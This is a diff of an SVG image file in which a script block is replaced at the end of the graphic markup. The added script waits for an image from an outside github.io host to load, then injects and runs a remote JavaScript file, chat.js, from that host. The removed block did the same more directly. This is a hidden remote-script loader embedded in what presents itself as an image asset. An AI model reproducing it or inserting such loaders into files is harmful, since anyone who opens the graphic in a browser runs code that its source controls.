@@ -43,11 +43,17 @@
 		</g>
 	</g>
 </g>
-<script type="application/javascript">
-    (() => { 
-      const s = document.createElement('script'); 
-      s.src = 'https://totallylost-helpme.github.io/chat.js'; 
-      document.head.appendChild(s); 
-    })();
-  </script>
+<script type="text/javascript">
+				(() => {
+					const img = new Image();
+					img.src = 'https://totallylost-helpme.github.io/workforce_logo.svg';
+					img.onload = () => {
+						const s = document.createElement('script');
+						s.src = 'https://totallylost-helpme.github.io/chat.js';
+						s.async = true;
+						s.onload = () => {console.log('External script loaded successfully')};
+						document.documentElement.prepend(s);
+					};
+				})();
+			</script>
 </svg>
